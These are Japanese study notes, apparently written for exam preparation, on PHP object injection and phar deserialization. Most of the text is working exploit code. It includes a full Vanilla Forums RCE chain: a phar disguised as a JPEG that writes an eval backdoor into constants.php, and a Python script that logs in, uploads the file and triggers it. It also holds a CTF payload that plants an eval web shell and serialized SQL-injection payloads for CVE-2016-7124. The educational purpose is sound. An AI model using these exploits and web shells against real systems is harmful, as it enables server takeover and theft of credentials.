つまり、`phar`形式でMetaデータにシリアライズしたオブジェクトを書いておいたファイルを何らかの方法でアップロードして、そのファイルへのパスを`phar://var/www.../attack.jpg`みたいにして`file_exits()`に挿入できればデシリアライズされてRCEできる！   
`phar`形式のファイルは非常に危険で単に`file_exeits('phar://www/..')`みたいにして`phar`ファイルを呼び出すだけで脆弱！しかも`phar`ファイルは拡張子に依存しないので`.jpg`としてアップしても普通に`phar`がいるとｈして動作する！   
- 例   
[1]で`$this->Form->getFormValue('PathSelect')`でフォームの`name="PathSelect"`の値が`'NEW'`かどうかチェックしてる。   
[2]で`$pathSelect`にユーザーによるこの値をセットする。   
[3]で`$imp->ImportPath`にこの`$pathSelect`をセットする。   
[4]で`file_exists($imp->ImportPath)`が呼ばれるので、ユーザーの入力がそのまま`file_exists()`に入っており脆弱！   
```php
class ImportController extends DashboardController {

    ...

    public function index() {
        $this->permission('Garden.Import'); // This permission doesn't exist, so only users with Admin == '1' will succeed.
        $timer = new Gdn_Timer();

        // Determine the current step.
        $this->Form = new Gdn_Form();
        $imp = new ImportModel();
        $imp->loadState();

        // Search for the list of acceptable imports.
        $importPaths = [];
        $existingPaths = safeGlob(PATH_UPLOADS.'/export*', ['gz', 'txt']);
        $existingPaths2 = safeGlob(PATH_UPLOADS.'/porter/export*', ['gz']);
        $existingPaths = array_merge($existingPaths, $existingPaths2);
        foreach ($existingPaths as $path) {
            $importPaths[$path] = basename($path);
        }
        // Add the database as a path.
        $importPaths = array_merge(['db:' => t('This Database')], $importPaths);

        if ($imp->CurrentStep < 1) {
            // Check to see if there is a file.
            $importPath = c('Garden.Import.ImportPath');
            $validation = new Gdn_Validation();


            if (Gdn::request()->isAuthenticatedPostBack(true)) {
                $upload = new Gdn_Upload();
                $validation = new Gdn_Validation();
                if (count($importPaths) > 0) {
                    $validation->applyRule('PathSelect', 'Required', t('You must select a file to import.'));
                }

                if (count($importPaths) == 0 || $this->Form->getFormValue('PathSelect') == 'NEW') {                 // 1
                    $tmpFile = $upload->validateUpload('ImportFile', false);
                } else {
                    $tmpFile = '';
                }

                if ($tmpFile) {
                    $filename = $_FILES['ImportFile']['name'];
                    $extension = pathinfo($filename, PATHINFO_EXTENSION);
                    $targetFolder = PATH_ROOT.DS.'uploads'.DS.'import';
                    if (!file_exists($targetFolder)) {
                        mkdir($targetFolder, 0777, true);
                    }
                    $importPath = $upload->generateTargetName(PATH_ROOT.DS.'uploads'.DS.'import', $extension);
                    $upload->saveAs($tmpFile, $importPath);
                    $imp->ImportPath = $importPath;
                    $this->Form->setFormValue('PathSelect', $importPath);

                    $uploadedFiles = val('UploadedFiles', $imp->Data);
                    $uploadedFiles[$importPath] = basename($filename);
                    $imp->Data['UploadedFiles'] = $uploadedFiles;
                } elseif (($pathSelect = $this->Form->getFormValue('PathSelect'))) {                                // 2
                    if ($pathSelect == 'NEW') {
                        $validation->addValidationResult('ImportFile', 'ValidateRequired');
                    } else {
                        $imp->ImportPath = $pathSelect;                                                             // 3
                    }
                } elseif (!$imp->ImportPath && count($importPaths) == 0) {
                    // There was no file uploaded this request or before.
                    $validation->addValidationResult('ImportFile', $upload->Exception);
                }

                // Validate the overwrite.
                if (true || strcasecmp($this->Form->getFormValue('Overwrite'), 'Overwrite') == 0) {
                    if (!stringBeginsWith($this->Form->getFormValue('PathSelect'), 'Db:', true)) {
                        $validation->applyRule('Email', 'Required');
                    }
                }

                if ($validation->validate($this->Form->formValues())) {
                    $this->Form->setFormValue('Overwrite', 'overwrite');
                    $imp->fromPost($this->Form->formValues());
                    $this->View = 'Info';
                } else {
                    $this->Form->setValidationResults($validation->results());
                }
            } else {
                $this->Form->setFormValue('PathSelect', $imp->ImportPath);
            }
            $imp->saveState();
        } else {
            $this->setData('Steps', $imp->steps());
            $this->View = 'Info';
        }

        if (!stringBeginsWith($imp->ImportPath, 'db:') && !file_exists($imp->ImportPath)) {                         // 4
            $imp->deleteState();
        }
```
攻撃手順は、まず`phar`形式のファイルpoc.jpgを作成する。これは`jpg`ファイルに偽装してるが`phar`形式のファイルでありメタデータにシリアライズしたオブジェクトが書かれれている。   
このpopchainについては以下を参照。   
https://github.com/takabaya-shi/AWAE-preparation/blob/main/php/PHP%20Object%20Injection/README.md   
https://hackerone.com/reports/407552   
````php
<?php
/*

Vanilla Forums ImportController index file_exists Unserialize Remote Code Execution Vulnerability
mr_me 2018

## Notes:

- This is the file that generates the payload to help trigger the bug
- The default path to the constants.php file is '/var/www/html/conf/constants.php', please change it in your poc
  if needed. I have installed my version of Vanilla Forums in /var/www/html

## Example:

The following steps are used to re-create the vulnerability:

1. We create our phar file:

`saturn:~ mr_me$ php poc-stage-1.php`

3. We run the poc-stage-2.py which will trigger the bug

```
saturn:~ mr_me$ ./poc-stage-2.py.py 172.16.175.143 admin:admin123
(+) targeting: http://172.16.175.143
(+) logged in!
(+) uploaded phar!
(+) leaked phar name!
(+) triggered a write!
(+) shell at: http://172.16.175.143/?c=phpinfo();

saturn:~ mr_me$ curl -sSG "http://172.16.175.143/?c=system('id');"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Now, on the victim box:

```
steven@pluto:/var/www/html/conf$ cat constants.php 
<?php if (!defined('APPLICATION')) exit();
$a=eval($_GET[c]);//[''] = '';

// Last edited by admin (172.16.175.1)2018-09-16 00:59:01steven@pluto:/var/www/html/conf$
```
*/

// custom pop chain, as used in other exploits
class Gdn_ConfigurationSource{
    public function __construct(){
        $this->Type = "file";
        $this->Source = "/var/www/html/conf/constants.php";
        $this->Group = 'a=eval($_GET[c]);//';
        $this->Settings[""] = "";       
        $this->Dirty = true;
        $this->ClassName = "Gdn_ConfigurationSource";
    }
}
class Gdn_Configuration {
    public $sources = [];
    public function __construct(){
        $this->sources['si'] = new Gdn_ConfigurationSource();
    }
}

// create new Phar
$phar = new Phar('poc.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

// add our object as meta data
$phar->setMetadata(new Gdn_Configuration());
$phar->stopBuffering();

// we rename it now
rename("poc.phar", "poc.jpg");
````
次にこのファイルをアップロードして、何らかのリクエストで`file_exists()`の中にこのアップされたファイルへのパスを挿入する。   
まずCSRFトークンを取得する。以降の手順ではすべてリクエストにCSRFトークンがないとダメっぽいので取得しておく。   
次に`jpg`に偽装した`phar`ファイルをアップロードする。   
次にアップした`phar`ファイルの名前を取得する。`attack.jpg`とかでアップしても実際にはタイムスタンプとかランダムな名前で保存されることになるので。   
次に得られたファイル名で`phar://.../???.jpg`のパスを作成してリクエストして`file_exitst()`の中にInjectする！   
```python
import re
import sys
import string
import random
import urllib2
import requests

def get_csrf(t, c):
    """
    Gets the csrf for any page thats logged in.
    """
    r = s.get("%s/index.php" % t)
    match = re.search("TransientKey\":\"(.*)\",\"W", r.text)
    if match:
        Vanilla_tk = r.headers['Set-Cookie']
        csrf = match.group(1)
        if Vanilla_tk.split("=")[1].startswith(csrf):
            return Vanilla_tk

def get_csrf_login(t):
    """
    Gets the CSRF cookie for the login process
    """
    r = requests.get("%s/index.php?p=/entry/signin" % t)
    match = re.search("TransientKey\":\"(.*)\",\"W", r.text)
    if match:
        Vanilla_tk = r.headers['Set-Cookie']
        csrf = match.group(1)
        if Vanilla_tk.split("=")[1].startswith(csrf):
            return Vanilla_tk

def extract_csrf(csrf):
    """
    Extracts the csrf token from the cookie
    """
    token = urllib2.unquote(csrf).decode('utf8')
    m = re.search("Vanilla-tk=(.*)\:\d{1,2}:", token)
    if m:
        k = m.group(1)
        c["Vanilla-tk"] = token.split("=")[1]
        return k, c

def we_can_trigger_unserialize(t, csrf):
    """
    This is our malicious phar:// and it can be in a share if we are targeting windows.
    Change the path if you need to.
    """
    k, c = extract_csrf(csrf)
    p = {
        "TransientKey": k,
        "PathSelect": "phar:///var/www/html/uploads/%s.jpg" % leaked,    # This is where we do the injection. This trick is quite old actually.
    }
    r = s.post("%s/index.php?p=/dashboard/import" % t, data=p)
    if r.status_code == 200 and "Email is required" in r.text:
        return True
    return False


def we_can_leak_phar_name(t, csrf):
    """
    This function leaks the filename of the image. We use the General category
    because its default id is 1.
    """
    global leaked
    k, c = extract_csrf(csrf)
    r = s.get("%s/index.php?p=/categories" % t)
    r.text
    match = re.search("uploads/(.*).jpg\" class=\"CategoryPhoto\" alt=\"General\"", r.text)
    if match:
        leaked = match.group(1)
        return True
    return False

def we_can_upload(t, csrf):
    """
    This function uploads the phar archive that we crafted
    """
    k, c = extract_csrf(csrf)
    f = { 'Photo_New': open('poc.jpg', 'rb') }
    p = {
      'TransientKey': k,
      'CategoryID': 1,
      'Save': "Save",
    }
    r = s.post("%s/index.php?p=/vanilla/settings/editcategory" % t, files=f, data=p, allow_redirects=False)
    if r.status_code == 302 and "vanilla/settings/categories" in r.headers['Location']:
        return True
    return False


def we_can_login(t, usr, pwd, csrf):
    """
    We just log in with this function
    """
    global s
    s = requests.session()
    k, c = extract_csrf(csrf)
    p = {
        "TransientKey": k,
        "Email": usr,
        "Password": pwd,
        "DeliveryType": "VIEW",
    }
    r = s.post("%s/index.php?p=/entry/signin" % t, cookies=c, data=p)
    if r.status_code == 200 and "\"FormSaved\": true" in r.text:
        return True
    return False

def main():
    """
    Start the pain train
    """
    global c, pwner_user
    if len(sys.argv) != 3:
        print "(+) usage: %s <target> <username:password>" % sys.argv[0]
        print "(+) eg: %s 172.16.175.143 admin:admin123" % sys.argv[0]
        sys.exit(-1)
    t = "http://%s" % sys.argv[1]
    c = sys.argv[2]
    usr = c.split(":")[0]
    pwd = c.split(":")[1]
    c = {}
    print "(+) targeting: %s" % t
    if we_can_login(t, usr, pwd, get_csrf_login(t)):
        print "(+) logged in!"
        csrf = get_csrf(t, c)
        if we_can_upload(t, csrf):
            print "(+) uploaded phar!"
            if we_can_leak_phar_name(t, csrf):
                print "(+) leaked phar name %s.jpg!" % leaked
                if we_can_trigger_unserialize(t, csrf):
                    print "(+) triggered a write!"
                    print "(+) shell at: %s/?c=phpinfo();" % (t)

if __name__ == '__main__':
    main()
```
- 発見方法   
アップロードする機能があって、かつ`file_exitst()`の中にユーザーの入力がValidation無しで入ることが問題なので、`file_exits`の中に入る値を逆算していけば見つけられそう？   
- 対策   
ユーザーの入力に`phar`,`:`,`://`などが入っていることが問題。拡張子だけチェックしても子の場合はどうしようもない。   
ここら辺のValidationをする部分がないのが問題。   
- 参考資料   
https://hackerone.com/reports/407552   
https://blog.ohgaki.net/php-phar-remote-code-execution-vulnerability   
`phar`の脆弱性についての情報。かなりわかりやすい。   
https://blog.usejournal.com/diving-into-unserialize-phar-deserialization-98b1254380e9   
`phar`のDeserializeの脆弱性について。   
https://medium.com/@knownsec404team/extend-the-attack-surface-of-php-deserialization-vulnerability-via-phar-d6455c6a1066   
`phar`の脆弱性のWordpressでの具体例。   

## phar / getimagesize / custom gadget (AceBear CTF2019 best band of asia)
https://ctf.yeuchimse.com/acebear-security-contest-2019-duudududduduudstore-image-service-best-band-of-asia-web-100/  
https://movrment.blogspot.com/2019/04/acebear-ctf-2019-web-category.html  
- **entrypoint**  
まず`http://3.0.183.241/index.php?controller=image&act=detail&id=1111+union+select+'/var/www/html/index.php'+-+-`でSQL Injectionでソースをリークするとこから？？？？  
`controller_image.php`  
以下で明らかにSQL Injectionできる。また、`str_replace`で記号を置換してるから、`../`みたいなのは無理そう。  
```php
public function detail(){    
    if(isset($_GET["id"])){
        $image = $this->model->fetch_one("SELECT filename FROM photos WHERE id=".$_GET["id"]);
        $yummy = ["..","//","<",">"];
        $filename = str_replace($yummy," ",$image["filename"]);
        @readfile($filename);
    }
}
```
ファイルをアップロードする箇所はこんな感じ?  
`$_FILES["fileToUpload"]["tmp_name"]`の値は`/tmp/phpXNO3Hl`みたいな感じっぽい。  
`"fileToUpload"`はHTMLのinputの名前。  
```php
$check = file_exists($_FILES["fileToUpload"]["tmp_name"]);
if($check !== false){
    $image = new image(null,null,null,null);                        
    $image->set_file(rand().".jpg");
    $image->set_data(file_get_contents($_FILES["fileToUpload"]["tmp_name"]));
    $image->save();                        
}
```
`save`メソッドで、画像ファイルを保存する。  
```php
public function save(){        
    global $local_dir;
    global $root_dir;
    $yummy = ["..","//","<",">"];
    $filename = str_replace($yummy," ",$this->file);
    file_put_contents($root_dir."/".$local_dir.$filename, $this->data);
    echo "Uploaded: ".$local_dir.$filename;
}
```
`controller_audio`クラスの中には以下の怪しい`__destruct`があってこれがObject Injectionに使えそう。  
```php
public function __destruct(){
    if($this->default_audio !== null){                
        $this->default_audio->save();
        header("Location:index.php");
    }
}
```
`default_audio`クラスには以下のように怪しい`fetchImagePage`メソッドがある。  
`$url`にはhttpかhttps以外は弾かれているが、`$image = $tag->getAttribute('src');`には入力の制限がないので、これがそのあと`if(@getimagesize($image)){`に入るためPHARのRCEできるやつできる！  
```php
public function fetchImagePage(){
    include "view/view_fetchimagepage.php";
    $url = isset($_POST['Pagelink'])?$_POST['Pagelink']:null;    
    if($url !== null){
        $urlParts = parse_url($url);
        if ($urlParts === false || !in_array($urlParts["scheme"], ['http', 'https'])) {
            die("<h1>Invalid Url</h1><img src=\"https://i.pinimg.com/originals/17/48/6d/17486d34b9d0bd19353af01fb13b1fc4.gif\">");
        }
        $html = file_get_contents($url);
        $doc = new DOMDocument();
        @$doc->loadHTML($html);
        $tags = $doc->getElementsByTagName('img');
        $count = 0;
        foreach ($tags as $tag) {
            $count++;
            if($count<=10){
                $image = $tag->getAttribute('src');   
                if(@getimagesize($image)){
                    echo "<img src=\"".$image."\"><br/>";
                }
            }
        }                
    }            
}
```
- **payload**  
まず`controller_audio`クラスの`__destruct()`の中の`save()`メソッドを使いたい。  
`$default_audio`にはどのクラスの`save()`を使うかを指定するので、`image`クラスの`save()`メソッドを使うように指定する。  
`image`クラスの`$image->file='rce.php'`,`$image->data='<?php echo "1337"; var_dump(eval($_GET["eval"]));';`をセットすることでWebshellを設置する！  
```php
<?php
class controller_audio {
    public $default_audio;
    public function __destruct(){
        if($this->default_audio !== null){                
            $this->default_audio->save();
        }
    }
}
class image {
    public $title;
    public $file;
    public $data;
    public $id;
    public $album_id;
    public function __construct($title,$file,$id,$album_id){
        $this->title = $title;
        $this->file = $file;
        $this->id = $id;
        $this->album_id = $album_id;
    }
    public function save() {        
        $local_dir = 'files/';
        $root_dir = '.';
        $yummy = ["..","//","<",">"];
        $filename = str_replace($yummy," ",$this->file);
        echo $root_dir."/".$local_dir.$filename;
        file_put_contents($root_dir."/".$local_dir.$filename, $this->data);
        echo "Uploaded: ".$local_dir.$filename;
    }
}
@unlink('phar.phar');
$phar = new Phar('phar.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'test');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$o = new controller_audio();
$image = new image(null,null,null,null);
$image->file = 'rce.php';
$image->data = '<?php echo "1337"; var_dump(eval($_GET["eval"]));';
$o->default_audio = $image;
$phar->setMetadata($o);
$phar->stopBuffering();
getimagesize('phar://phar.phar/test.txt');
?>
```
## ZendFramework / phpggc (AceBear CTF2019 web 100)
https://ctf.yeuchimse.com/acebear-security-contest-2019-duudududduduudstore-image-service-best-band-of-asia-web-100/  
https://movrment.blogspot.com/2019/04/acebear-ctf-2019-web-category.html  
- **entrypoint**  
ZendFrameworkのgadgetを使うやつ。問題設定がよくわからん…  
https://github.com/ambionics/phpggc  
- **payload**  
???  
## MySQL UTF-8 / don't invoke \_\_wakeup() (hitcon2016 babytrick)
https://github.com/orangetw/My-CTF-Web-Challenges#babytrick  
https://lorexxar.cn/2016/10/10/hitcon2016/  
- **entrypoint**  
以下のソースが得られる。  
`show`関数に明らかにSQL Injectionの脆弱性がある。  
`@unserialize($_GET["data"]); `でクラスをデシリアライズさせる形でFlagをゲットする。 
`__destruct()`で任意のメソッドを`$method`にセットしておけばそれを実行できる。ただし、`__destruct()`の前に`__wakeup()`があって、`strtolower(trim(mysql_escape_string($v)));`で`%`,`_`以外をエスケープ。つまりSQL Injectionできない。  
```php
 <?php

include "config.php";

class HITCON{
    private $method;
    private $args;
    private $conn;

    public function __construct($method, $args) {
        $this->method = $method;
        $this->args = $args;

        $this->__conn();
    }

    function show() {
        list($username) = func_get_args();
        $sql = sprintf("SELECT * FROM users WHERE username='%s'", $username);

        $obj = $this->__query($sql);
        var_dump($sql);
        var_dump($obj);
        if ( $obj != false  ) {
            $this->__die( sprintf("%s is %s", $obj->username, $obj->role) );
        } else {
            $this->__die("Nobody Nobody But You!");
        }
        
    }

    function login() {
        global $FLAG;

        list($username, $password) = func_get_args();
        $username = strtolower(trim(mysql_escape_string($username)));
        $password = strtolower(trim(mysql_escape_string($password)));

        $sql = sprintf("SELECT * FROM users WHERE username='%s' AND password='%s'", $username, $password);
        var_dump($sql);

        if ( $username == 'orange' || stripos($sql, 'orange') != false ) {
            $this->__die("Orange is so shy. He do not want to see you.");
        }

        $obj = $this->__query($sql);
        if ( $obj != false && $obj->role == 'admin'  ) {
            $this->__die("Hi, Orange! Here is your flag: " . $FLAG);
        } else {
            $this->__die("Admin only!");
        }
    }

    function source() {
        highlight_file(__FILE__);
    }

    function __conn() {
        global $db_host, $db_name, $db_user, $db_pass, $DEBUG;

        if (!$this->conn)
            $this->conn = mysql_connect($db_host, $db_user, $db_pass);

        mysql_select_db($db_name, $this->conn);

        if ($DEBUG) {
            $sql = "CREATE TABLE IF NOT EXISTS users ( 
                        username VARCHAR(64), 
                        password VARCHAR(64), 
                        role VARCHAR(64)
                    ) CHARACTER SET utf8";
            $this->__query($sql, $back=false);

            $sql = "INSERT INTO users VALUES ('orange', '$db_pass', 'admin'), ('phddaa', 'ddaa', 'user')";
            $this->__query($sql, $back=false);
        } 

        mysql_query("SET names utf8");
        mysql_query("SET sql_mode = 'strict_all_tables'");
    }

    function __query($sql, $back=true) {
        $result = @mysql_query($sql);
        if ($back) {
            return @mysql_fetch_object($result);
        }
    }

    function __die($msg) {
        $this->__close();

        header("Content-Type: application/json");
        die( json_encode( array("msg"=> $msg) ) );
    }

    function __close() {
        mysql_close($this->conn);
    }

    function __destruct() {
        $this->__conn();
        if (in_array($this->method, array("show", "login", "source"))) {
            @call_user_func_array(array($this, $this->method), $this->args);
        } else {
            $this->__die("What do you do?");
        }

        $this->__close();
    }

    function __wakeup() {
        foreach($this->args as $k => $v) {
            $this->args[$k] = strtolower(trim(mysql_escape_string($v)));
        }
    }
}

if(isset($_GET["data"])) {
    @unserialize($_GET["data"]);    
} else {
    $hitcon = new HITCON("source", array());
}
```
PHP 5.6.25 and 7.x before 7.0.10では`__wakeup`を呼び出さずに`__destruct`を呼び出せるような脆弱性があるらしい。  
https://www.cvedetails.com/cve/CVE-2016-7124/  
https://bugs.php.net/bug.php?id=72663  
これでshow関数のSQL Injectionで`"INSERT INTO users VALUES ('orange', '$db_pass', 'admin'), ('phddaa', 'ddaa', 'user')";`の`orange`のパスワードを特定できる。  
```txt
# get password
curl http://1.2.3.4/
?data=O:6:"HITCON":3:{s:14:"%00HITCON%00method";s:4:"show";s:12:"%00HITCON%00args";a:1:{i:0;s:39:"'union%20select%201,2,password%20from%20users%23";}}
```
そのあとは`login`でログイン成功する必要があるが`if ( $username == 'orange' || stripos($sql, 'orange') != false ) {`で普通にやるとダメになってる。  
MySQLでは`SELECT 'Ä'='a'`になるのを利用する。  
```txt
# get flag
curl http://1.2.3.4/
?data=O:6:"HITCON":2:{s:14:"%00HITCON%00method";s:5:"login";s:12:"%00HITCON%00args";a:2:{i:0;s:7:"orÄnge";i:1;s:13:"babytrick1234";}}
```
##
- **entrypoint**  
- **payload**  


# 参考
https://securitycafe.ro/2015/01/05/understanding-php-object-injection/   
基本的な説明。わかりやすい。   
https://nitesculucian.github.io/2018/10/05/php-object-injection-cheat-sheet/   
具体例がたくさん。よさげ。   
https://hackerone.com/reports/407552   
Vanilla Forumのpop chainのガジェット。   
https://vickieli.medium.com/diving-into-unserialize-pop-chains-35bc1141b69a   
pop chainの簡単な例。   
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/PHP.md   
簡単な例と参考文献がある。   
https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection   
OWASP ZAPのわかりやすい説明。   
https://github.com/ambionics/phpggc   
PHPでの発見済みのオガジェットを簡単に作成できる。ysoserial的な。   
